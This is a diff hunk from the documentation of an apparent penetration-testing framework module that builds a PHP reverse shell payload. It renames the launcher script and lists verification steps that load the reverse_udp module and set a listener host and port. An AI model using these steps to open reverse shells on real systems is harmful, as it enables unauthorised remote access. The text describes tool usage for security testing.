@@ -4,7 +4,7 @@ Module generates payload that creates interactive tcp reverse shell by using php
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./fxf.py`
   2. Do: `use payloads/php/reverse_udp`
   3. Do: `set lhost 192.168.1.4`
   3. Do: `set lport 4321`
